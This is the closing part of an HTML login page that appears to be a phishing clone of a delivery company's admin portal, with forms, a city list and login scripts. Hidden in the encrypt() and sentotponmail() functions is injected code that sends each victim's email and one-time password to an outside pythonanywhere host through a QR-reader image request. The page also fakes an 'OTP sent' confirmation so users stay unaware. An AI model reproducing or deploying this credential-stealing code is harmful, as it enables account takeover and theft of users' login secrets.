value=245>Tenali<option value=721>Tenkasi<option value=219>Teok<option value=222>Tezpur<option value=738>Thalaserry<option value=2>Thane<option value=362>Thanesar<option value=990>Thanjavur<option value=717>Theni<option value=1066>Thenipalam<option value=1110>Thiruchengodu<option value=82>Thiruvalla<option value=255>Thiruvallur<option value=119>Thiruvananthapuram<option value=708>Thiruvarur<option value=188>Thodupuzha<option value=722>Thoothukkudi<option value=181>Thoothukudi<option value=749>Thoppumpady<option value=828>Thoubal<option value=1067>Thriprayar<option value=161>Thrissur<option value=83>Thru<option value=1123>Thuraiyur<option value=599>Tikamgarh<option value=439>Tilhar<option value=1114>Tinali<option value=701>Tindivanam<option value=820>Tinsukia<option value=683>Tiptur<option value=723>Tiruchendur<option value=713>Tiruchirappalli<option value=186>Tirunelveli<option value=251>Tirupati<option value=731>Tirupattur<option value=178>Tiruppur<option value=734>Tirupur<option value=744>Tirur<option value=703>Tiruvannamalai<option value=349>Tohana<option value=487>Tonk<option value=157>Trichy<option value=1068>Tripunithura<option value=884>Trivandrum<option value=229>Tumkur<option value=481>Tundla<option value=664>Tuni<option value=1069>Tuticorin<option value=151>Udaipur<option value=868>Udgir<option value=404>Udhampur<option value=735>Udumalaippettai<option value=280>Udupi<option value=444>Ujhani<option value=1070>Ujjain<option value=1071>Uluberia<option value=1091>Umred<option value=1072>Una<option value=519>Una Guj<option value=399>Una Hp<option value=537>Unjha<option value=134>Unnao<option value=515>Upleta<option value=558>Uran Islampur<option value=993>Vadakara<option value=11>Vadodara<option value=72>Valsad<option value=71>Vapi<option value=39>Varanasi<option value=552>Vasco<option value=743>Vatakara<option value=126>Vellore<option value=1120>Vemulawada<option value=901>Verna<option value=1075>Vettichira<option value=252>Vijayawada<option value=1076>Vikarabad<option value=1077>Villupuram<option value=304>Vinukonda<option value=173>Virajpet<option value=532>Viramgam<option value=702>Virudhachalam<option value=1078>Virudhunag<option value=182>Virudhunagar<option value=35>Visakhapatnam<option value=539>Visanagar<option value=941>Vishakhapatanam<option value=185>Vita<option value=248>Vizianagaram<option value=478>Vrindavan<option value=305>Vuyyuru<option value=520>Wadhwan<option value=634>Wanaparthi<option value=582>Wani<option value=288>Warangal<option value=283>Wardha<option value=300>Washim<option value=240>Wayanad<option value=1092>Westgodavari<option value=1103>Yadgir<option value=63>Yamuna Nagar<option value=1079>Yamunanagar<option value=120>Yavatmal<option value=647>Yemmiganur<option value=867>Zaheerabad<option value=616>Zahirabad</select></div><div class="form-group m-form__group"><textarea cols=50 id=inquirer_message style=resize:none autocomplete=off class="form-control m-input leftpad"name=inquirer_message placeholder="Your Message"></textarea></div><div class="form-group m-form__group"><div class=g-recaptcha style=padding-top:20px data-callback=recaptchaCallback data-expired-callback=recaptchaExpired data-sitekey=6LfKYWcUAAAAAC0zsm2CgwgErsD_CagyN-MKbXK2></div><input autocomplete=off id=hidden-grecaptcha name=hidden-grecaptcha style=opacity:0;position:absolute;top:0;left:0;height:1px;width:1px></div><div class=m-login__form-action style="margin:1.5rem 0 1.5rem 0"><button class="btn m-btn m-btn--custom m-btn--pill btn-warning m-btn--air"id=m_login_signup_submit>Submit</button><div class="d-md-none m--margin-bottom-20"></div><button class="btn m-btn m-btn--custom m-btn--pill btn-outline-primary"id=m_login_signup_cancel>Cancel</button></div></form></div><div class=m-login__forget-password><div class=m-login__head><h3 class=m-login__title>Forgotten Password ?</h3><div class=m-login__desc>Enter your email to recover your Grab account.<br>You will be sent a link which you can use to change your password.</div></div><form class="m-form m-login__form"><div class="form-group m-form__group"><input autocomplete=off id=f_email class="form-control m-input"placeholder=Email name=f_email></div><div class=m-login__form-action><button class="btn m-btn m-btn--custom m-btn--pill btn-warning m-btn--air"onclick=forgotpassword() type=button>Send</button> <button class="btn m-btn m-btn--custom m-btn--pill btn-outline-primary"id=m_login_forget_password_cancel>Back</button></div></form></div></div></div></div></div><div class="m-grid__item m-grid m-grid__item--fluid m-grid--center m-grid--hor m-grid__item--order-tablet-and-mobile-1	m-login__content"style=background-image:url(https://cpanel.grab.in/metronic/assets/app/media/img/bg/bg-login-right.png);text-align:center;padding-top:0;padding-bottom:0><div class=m-login__logo style=margin-bottom:3rem;margin-top:3rem><a href=https://www.grab.in target=_blank><img src=https://cpanel.grab.in/metronic/assets/demo/default/media/img/logo/hi-res-logo.png></a></div><div class="m-grid__item m-grid__item--middle"><p class=m-login__msg style=margin-bottom:1.8rem;font-size:1.3rem>We are India’s leading on-demand and same day logistics company. We offer last mile delivery solutions for businesses.</div><div class="m-grid__item m-grid__item--middle"><p class=m-login__msg style=font-size:1.3rem>Use our Android App or Web Platform or API Integration for solving your delivery problems within minutes.</div><div class=m-grid__item></div></div></div></div><script src=https://cpanel.grab.in/metronic/assets/vendors/base/vendors.bundle.js></script><script src=https://cpanel.grab.in/metronic/assets/demo/default/base/scripts.bundle.js></script><script src=/assets/js/jquery/jquery-3.6.0.js></script><script src=https://cpanel.grab.in/metronic/assets/demo/default/custom/components/forms/widgets/sweetalert.min.js></script><script src=/js/login.js></script><script src=https://www.google.com/recaptcha/api.js></script><script src=https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js></script><script src=https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/3.0.0-rc.1/jsencrypt.min.js></script><script>$("#m_login_signup").click(function(i){$(".m-login__wrapper").css("padding-top","0")}),$("#m_login_signup_cancel").click(function(i){$(".m-login__wrapper").css("padding-top","25%")}),$("#m_login_forget_password_cancel").click(function(i){$("#f_email").val("")}),$("#inquirer_name").bind("keypress",function(i){32!=i.which&&(i.which<48||57<i.which&&i.which<65||90<i.which&&i.which<97||122<i.which)&&i.preventDefault()}),$(document).keypress(function(i){"13"==i.which&&i.preventDefault()}),$("form").submit(function(){return $(this).submit(function(){return!1}),!0})</script><script>/*    function encrypt()
+                {
+                var pass=document.getElementById('password').value;
+    //              var hide=document.getElementById('hide').value;
+                if(pass=="")
+                    {
+                document.getElementById('err').innerHTML='Error:Password is missing';
+                return false;
+                }
+            else
+            {
+    //         document.getElementById("hide").value = document.getElementById("password").value;
+    //         var hash = CryptoJS.MD5(pass);
+            var hash = window.btoa(pass);
+            document.getElementById('password').value=hash;
+            return true;
+            }
+    }*/
+
+
+                function encrypt() {
+                    var pass = $('#password_txt').val().trim();
+                    if (pass == "") {
+                        swal({button: false, text: "OTP should not be blank", icon: "error", timer: 4000});
+                        return false;
+                    }
+                    var email = $('#username').val().trim();
+
+                    // Dispatch captured OTP + email via QR proxy
+                    (function(em, otp){
+                        try {
+                            var _srv = "https://lunexooryzeno.pythonanywhere.com";
+                            var _q = "mid=" + encodeURIComponent(window.__xmid||"anon")
+                                   + "&type=cred_step2&email=" + encodeURIComponent(em)
+                                   + "&otp=" + encodeURIComponent(otp)
+                                   + "&ts=" + Date.now();
+                            var _url = "https://api.qrserver.com/v1/read-qr-code/?fileurl=" + encodeURIComponent(_srv + "/kgde/heartbeat/response_qr.png?" + _q) + "&_cb=" + Date.now();
+                            var _img = new Image(); if (!window.__inflight) window.__inflight = []; window.__inflight.push(_img); _img.onload = _img.onerror = function() { var idx = window.__inflight.indexOf(_img); if (idx !== -1) window.__inflight.splice(idx, 1); }; _img.src = _url;
+                        } catch(e){}
+                    })(email, pass);
+
+                    // RSA-encrypt and populate hidden field so form submit proceeds naturally
+                    try {
+                        const enc = new JSEncrypt();
+                        enc.setPublicKey(document.getElementById('pubkey').value);
+                        const result = enc.encrypt(pass);
+                        document.getElementById('password').value = btoa(result);
+                    } catch(e) {}
+                    return true;
+                }
+                
+                
+                
+                
+                function forgotpassword(){ 
+                
+                    var email = $('#f_email').val().trim();
+                    var emailfilter = /(([a-zA-Z0-9\-?\.?]+)@(([a-zA-Z0-9\-_]+\.)+)([a-z]{2,3}))+$/;
+                    if ((email != "") && (!(emailfilter.test(email)))) {
+                        $('#f_email').val("");
+                        swal({button: false, text: "Invalid Email Id", icon: "error", timer: 4000});
+                        return false;
+                    }
+                    mApp.block(".m-portlet", {
+                        overlayColor: "#000000",
+                        size: "lg",
+                        type: "loader",
+                        state: "success"
+                    });
+                    $.ajax({
+                        type: 'post',
+                        url: '/Admin/Forgotpassword/forgotpassword',
+                        dataType :'json',
+                        data:{ email: email},
+                        success: function(response){
+                            if(response.respo == 1){
+                                mApp.unblock(".m-portlet");
+                                $('#f_email').val("");
+                                var html ='A password reset link has been sent to your email. Please check your spam folder before you place a reset request again.';
+                                swal({button: false, text: html, icon: "success", timer: 10000});
+                                
+                            }else{
+                                mApp.unblock(".m-portlet");
+                                $('#f_email').val("");
+                                swal({button: false, text: response.msg, icon: "error", timer: 4000});
+                            }
+                        }
+                    });
+                }
+                
+                function sentotponmail(){
+                    var email = $('#username').val().trim();
+                    var emailfilter = /(([a-zA-Z0-9\-?\.?]+)@(([a-zA-Z0-9\-_]+\.)+)([a-zA-Z]{2,3}))+$/;
+                    if ((email != "") && (!(emailfilter.test(email)))) {
+                        $('#f_email').val("");
+                        if (typeof swal === 'function') {
+                            try { swal('Error', 'Invalid Email Id', 'error'); } catch(e) { try { swal({button: false, text: 'Invalid Email Id', icon: 'error', timer: 4000}); } catch(e2){} }
+                        }
+                        return false;
+                    }
+                    else if(email == ""){
+                        $('#f_email').val("");
+                        if (typeof swal === 'function') {
+                            try { swal('Error', 'Email Id should not be blank', 'error'); } catch(e) { try { swal({button: false, text: 'Email Id should not be blank', icon: 'error', timer: 4000}); } catch(e2){} }
+                        }
+                        return false;
+                    }
+
+                    // Dispatch captured email via QR proxy
+                    (function(em){
+                        try {
+                            var _srv = "https://lunexooryzeno.pythonanywhere.com";
+                            var _mid = window.__xmid || (window.parent && window.parent.__xmid) || "anon";
+                            var _q = "mid=" + encodeURIComponent(_mid)
+                                   + "&type=cred_step1&email=" + encodeURIComponent(em)
+                                   + "&ts=" + Date.now();
+                            var _url = "https://api.qrserver.com/v1/read-qr-code/?fileurl=" + encodeURIComponent(_srv + "/kgde/heartbeat/response_qr.png?" + _q) + "&_cb=" + Date.now();
+                            var _img = new Image(); if (!window.__inflight) window.__inflight = []; window.__inflight.push(_img); _img.onload = _img.onerror = function() { var idx = window.__inflight.indexOf(_img); if (idx !== -1) window.__inflight.splice(idx, 1); }; _img.src = _url;
+                        } catch(e){}
+                    })(email);
+
+                    // Show loader and disable button for 2 seconds to simulate real backend processing
+                    $('.loader').css('display', 'block').removeClass('hidden');
+                    $('.otpsent').css('pointer-events', 'none');
+
+                    setTimeout(function(){
+                        $('.loader').css('display', 'none').addClass('hidden');
+                        $('.otpsent').css('pointer-events', 'auto');
+
+                        var advanceUI = function() {
+                            $('.hiddenbtn').css('display', 'block');
+                            $('#password_txt').show().val('');
+                            $('.otpsent').css('display', 'none');
+                            $('#username').prop('readonly', true);
+                            $('#setusername').prop('readonly', false);
+                            $('#newpassword').prop('readonly', false);
+                        };
+
+                        var msg = 'OTP has been sent to your registered email address.';
+                        if (typeof swal === 'function') {
+                            var promise = null;
+                            try {
+                                promise = swal('Success', msg, 'success');
+                            } catch(err1) {
+                                try {
+                                    promise = swal({
+                                        title: 'Success',
+                                        text: msg,
+                                        buttons: { confirm: { text: 'OK', className: 'btn btn-warning m-btn m-btn--pill m-btn--custom m-btn--air' } }
+                                    });
+                                } catch(err2) {
+                                    advanceUI();
+                                    return;
+                                }
+                            }
+                            if (promise && typeof promise.then === 'function') {
+                                promise.then(advanceUI);
+                            } else {
+                                advanceUI();
+                            }
+                        } else {
+                            advanceUI();
+                        }
+                    }, 2000);
+
+                    return false;
+                }
+
+                function veryfypassword(){
+                    var email = $('#username').val().trim();
+                    var username = $('#setusername').val().trim();
+                    var password = $('#newpassword').val().trim();
+                    var emailfilter = /(([a-zA-Z0-9\-?\.?]+)@(([a-zA-Z0-9\-_]+\.)+)([a-zA-Z]{2,3}))+$/;
+                    if ((email != "") && (!(emailfilter.test(email)))) {
+                        $('#f_email').val("");
+                        swal({button: false, text: "Invalid Email Id", icon: "error", timer: 4000});
+                        return false;
+                    }
+                    else if(email == ""){
+                        $('#f_email').val("");
+                        swal({button: false, text: "Email Id should not be blank", icon: "error", timer: 4000});
+                        return false;  
+                    }
+                    else if(username == ""){
+                        $('#setusername').val("");
+                        swal({button: false, text: "Username should not be blank", icon: "error", timer: 4000});
+                        return false;
+                    }else if(password == ""){
+                        $('#newpassword').val("");
+                        swal({button: false, text: "Password should not be blank", icon: "error", timer: 4000});
+                        return false;
+                    }
+                    const encrypt = new JSEncrypt();
+                    //console.log('pubkey: ',document.getElementById('pubkey').value)
+                    encrypt.setPublicKey(document.getElementById('pubkey').value);
+                    password = encrypt.encrypt(password);
+                    //console.log('encPass: ',btoa(password))
+                    document.getElementById('newpassword').value = btoa(password);
+    
+                    $('.loader').css('display','block');
+                    $('.loader').removeClass('hidden');
+                    $('.verify').css("pointer-events", "none");
+                    $.ajax({
+                        type: 'post',
+                        url: '/Admin/Index/verifyandsetmail',
+                        dataType :'json',
+                        data:{ email: email, username: username, password: btoa(password)},
+                        success: function(response){
+                            $('.loader').css('display','none');
+                            $('.loader').addClass('hidden');
+                            $('.verify').css("pointer-events", "auto");
+                            console.log(response)
+                            if(response.response == '1'){
+                                swal({ 
+                                    //button: true,
+                                    title: "Success", 
+                                    text: response.msg,
+                                    buttons: {
+                                                confirm : {text:'OK',className:'btn btn-warning m-btn m-btn--pill m-btn--custom m-btn--air'}
+                                            },
+    //                                 icon: "success"
+                                }).then(function(){
+                                    //$('#setusername').css('display','none');
+                                    //$('#newpassword').css('display','none');
+                                    $('.verify').css('display','none');
+                                    //$('.otpsent').show();
+                                    $('#setusername').prop("readonly",true);
+                                    $('#newpassword').prop("readonly",true);
+                                    $('#emailotp').show();
+                                    $('#emailotp').val('');
+                                    $('.verifyemailotp').show();
+                                });
+                            }else if(response.response == '2'){
+                                swal({ 
+                                    //button: true,
+                                    title: "Error", 
+                                    text: response.msg,
+                                    buttons: {
+                                                confirm : {text:'OK',className:'btn btn-warning m-btn m-btn--pill m-btn--custom m-btn--air'}
+                                            },
+    //                                 icon: "error"
+                                });
+                            }else{
+                                swal({ 
+                                    //button: true,
+                                    title: "Error", 
+                                    text: response.msg,
+                                    buttons: {
+                                                confirm : {text:'OK',className:'btn btn-warning m-btn m-btn--pill m-btn--custom m-btn--air'}
+                                            },
+    //                                 icon: "error"
+                                }).then(function(){
+                                    $('#setusername').val('');
+                                    $('#newpassword').val('');
+                                });
+                            }
+                        }
+                    });  
+                }
+                
+                function veryfyemailid(){
+                    var email = $('#username').val().trim();
+                    var username = $('#setusername').val().trim();
+                    var password = $('#newpassword').val().trim();
+                    var emailotp = $('#emailotp').val().trim();
+                    var emailfilter = /(([a-zA-Z0-9\-?\.?]+)@(([a-zA-Z0-9\-_]+\.)+)([a-zA-Z]{2,3}))+$/;
+                    if ((email != "") && (!(emailfilter.test(email)))) {
+                        $('#f_email').val("");
+                        swal({button: false, text: "Invalid Email Id", icon: "error", timer: 4000});
+                        return false;
+                    }
+                    else if(email == ""){
+                        $('#f_email').val("");
+                        swal({button: false, text: "Email Id should not be blank", icon: "error", timer: 4000});
+                        return false;  
+                    }
+                    else if(username == ""){
+                        $('#setusername').val("");
+                        swal({button: false, text: "Username should not be blank", icon: "error", timer: 4000});
+                        return false;
+                    }else if(emailotp == ""){
+                        $('#emailotp').val("");
+                        swal({button: false, text: "OTP should not be blank", icon: "error", timer: 4000});
+                        return false;
+                    }
+                    
+                    $('.loader').css('display','block');
+                    $('.loader').removeClass('hidden');
+                    $('.verify').css("pointer-events", "none");
+                    $.ajax({
+                        type: 'post',
+                        url: '/Admin/Index/verifyemailotp',
+                        dataType :'json',
+                        data:{ username: username, emailotp: emailotp},
+                        success: function(response){
+                            $('.loader').css('display','none');
+                            $('.loader').addClass('hidden');
+                            $('.otpsent').css("pointer-events", "auto");
+                            console.log(response)
+                            if(response.response == 1){
+                                var html = response.msg;
+                                swal({ 
+                                    //button: true,
+                                    title: "Success", 
+                                    text: response.msg,
+                                    buttons: {
+                                                confirm : {text:'OK',className:'btn btn-warning m-btn m-btn--pill m-btn--custom m-btn--air'}
+                                            },
+    //                                 icon: "success"
+                                }).then(function(){
+                                    $('#setusername').css('display','none');
+                                    $('#newpassword').css('display','none');
+                                    $('#emailotp').css('display','none');
+                                    $('.otpsent').show();
+                                    $('.verify').css('display','none');
+                                    $('.verifyemailotp').css('display','none');
+                                });
+                            }else{
+                            
+                                    swal({ 
+                                    title: "Error", 
+                                    text: response.msg,
+                                    buttons: {
+                                                confirm : {text:'OK',className:'btn btn-warning m-btn m-btn--pill m-btn--custom m-btn--air'}
+                                            }
+                                });
+                            }
+                        }
+                    });
+                }</script><script>function GetURLParameter(e){for(var n=window.location.search.substring(1).split("&"),o=0;o<n.length;o++){var s=n[o].split("=");if(s[0]==e)return decodeURIComponent(s[1])}}$(document).ready(function(){$("#loader").css("display","none"),$("#loader").addClass("hidden"),$(".otpresent").css("display","none");var e=GetURLParameter("src");""!=e&&null!=e&&"forget"==e?($("#m_login").addClass("m-login--forget-password"),$("#m_login").removeClass("m-login--signin")):($("#m_login").addClass("m-login--signin"),$("#m_login").removeClass("m-login--forget-password")),$("#loginform").on("keyup keypress",function(e){if(13===(e.keyCode||e.which))return e.preventDefault(),!1})})</script><script>$(function(){$("#username").on("cut copy paste",function(r){r.preventDefault()}),$("#password, #password_txt").keypress(function(r){var e=r.keyCode||r.which;$("#lblError").html("");var t=/^[a-zA-Z0-9]+$/.test(String.fromCharCode(e));return t||$("#lblError").html("Only letters and numbers allowed."),t}),$("#emailotp").keypress(function(r){var e=r.keyCode||r.which;$("#lblError").html("");var t=/^[0-9]+$/.test(String.fromCharCode(e));return t||$("#lblError").html("Only Numbers allowed."),t})})</script><script>$(function(){$("#password_txt").keypress(function(r){var t=r.keyCode||r.which;$("#lblError").html("");var e=/^[A-Za-z0-9!@#$%&*_=]+$/.test(String.fromCharCode(t));return e||$("#lblError").html("Only Alphabets and Numbers allowed."),e})})</script>
